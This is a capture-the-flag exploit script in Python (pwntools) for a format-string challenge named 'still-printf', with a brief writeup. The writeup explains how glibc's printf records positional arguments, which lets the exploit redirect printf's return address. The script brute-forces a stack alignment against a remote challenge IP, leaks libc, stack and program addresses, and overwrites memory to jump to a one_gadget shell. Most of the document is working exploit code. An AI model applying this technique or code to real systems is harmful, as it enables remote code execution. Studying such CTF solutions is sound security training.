from pwn import *

g_local=0
count = 0

"""
----- A Brief Writeup -----
My solution is probably unintended.

The idea is returning back to fgets with leak from printf.

The approach is to utilize a stack pointer chain in stack.
In this challenge `15$` points to `41$`,
so we can use something like `xxx%15$hnxxx%41$hhn` to firstly
write `41$` and let it points to return address of printf,
then use `41$` to change return address of printf.
However, if we use format string in this way,
original `41$` value is fetched instead of the rewritten one.

By debugging and reading source code of printf,
we found that when first `$` is encounted,
all arguments will be recorded into a `args_value` array.
https://elixir.bootlin.com/glibc/glibc-2.28/source/stdio-common/vfprintf.c#L1698
Thus old value will be recorded before it is updated by first `%n`.
When `41$` is encounterd later, value will be fetched from `args_value`
instead of stack.

Thus, the approach is not using positional argument for first `%n`,
which is achievable in 0x30 characters!
We can also leak the data before reaching `15$`,
which have all pointers we need.

With leak, everything is easy.

Note that, this approach need 4096 bruteforces,
so we rent a server in Germany to bruteforce.
"""

while True:
	print(count)
	context(log_level='info', arch='amd64')
	if g_local:
		sh = process("./still-printf", env={'LD_LIBRARY_PATH':'.'})
		# gdb.attach(sh, "b printf\nb *0x7ffff7e5bb42\nb *0x7ffff7e5d4b0\nc")
		# gdb.attach(sh)
	else:
		sh = remote("168.119.161.224", 9509)

	def hn(pos, val):
		assert val < 0x10000
		if val == 0:
			return "%" + str(pos) + "$hn"
		else:
			return "%" + str(val) + "c%" + str(pos) + "$hn"

	def cont_shoot(poses, vals, prev_size = 0):
		assert len(poses) == len(vals)
		size = len(poses)
		ret = ""
		i = 0
		cur_size = prev_size
		next_overflow = ((prev_size + 0xffff) / 0x10000) * 0x10000
		while i < size:
			assert next_overflow >= cur_size
			num = next_overflow - cur_size + vals[i]
			if num < 0x10000:
				ret += hn(poses[i], num)
				next_overflow += 0x10000
			else:
				num = vals[i] - (cur_size - (next_overflow - 0x10000))
				assert num >= 0
				ret += hn(poses[i], num)
			cur_size += num
			i += 1
		return ret

	# pld = cont_shoot([15, 15+26], [0xed28, 0x4242])
	# assert len(pld) < 0x30
	# pld = "%60699c" + '%c' * 13 + "%hn%1c%41$hn"
	# print(pld)

	pld = "%p" # libc
	size = 14
	pld += "%p" # stack (input addr)
	size += 14
	pld += "%c" * 2
	size += 2
	# pass some registers
	# now next one is 0x77, we can use * to save 1 char
	pld += "%*c"
	size += 0x77
	pld += "%c" * 5
	size += 5

	# other registers and our input
	pld += "%p" # pie
	size += 14
	pld += "%c"
	size += 1

	pld += "%" + str(0xed28-size) + "c"
	# pld += "%c"


	# write stack pointer chain, need 0x1000 bruteforce...
	pld += "%hn%" + str(0xdd-0x28) + "c%41$hhn"
	# write return address to 0xdd
	print(hex(size))
	sh.send(pld)


	sh.recvuntil("0x")
	libc_addr = int(sh.recvuntil("8d00x")[:-2], 16) - 0x1bd8d0
	stack_addr = int(sh.recvuntil("0\x88")[:-1], 16)
	sh.recvuntil("0x")
	prog_addr = int(sh.recvuntil("200\x9b")[:-1], 16) - 0x1200

	print(hex(libc_addr), hex(stack_addr), hex(prog_addr))

	if (stack_addr & 0xffff) != 0xed30:
		sh.close()
		count += 1
		continue
	# otherwise we cannot get back to printf
	print("!!!!!!!!!!bruteforce success!!!!!!!!!!!!")
	context(log_level='debug')
	if g_local:
		gdb.attach(sh)

	# now we have leak, so now exploitation is normal
	one_gadget = libc_addr + 0x448a3

	# pld2 = cont_shoot([10, 9], [one_gadget&0xffff, (one_gadget>>16)&0xffff])

	low_word = one_gadget&0xffff
	mid_byte = (one_gadget>>16)&0xff

	pld2 = "%" + str(low_word) + "c%10$hn"
	tmp = low_word & 0xff
	if tmp < mid_byte:
		print("tmp < mid_byte")
		pld2 += "%" + str(mid_byte - tmp) + "c%9$hhn"
	elif tmp > mid_byte:
		print("tmp > mid_byte")
		pld2 += "%" + str(0x100 - tmp + mid_byte) + "c%9$hhn"
	else: # ==
		pld2 += "%9$hhn"

	assert len(pld2) <= 0x18
	pld2 = pld2.ljust(0x18, '\x00')
	pld2 += p64(prog_addr + 0x3382)
	pld2 += p64(prog_addr + 0x3380)
	pld2 += p64(0) # one_gadget

	sh.interactive()

	sh.send(pld2)
	# sh.sendline("%15$p%15$s")
	# sh.sendline("%15$*7$cA")
	sh.interactive()
	# if g_local:
	# 	break
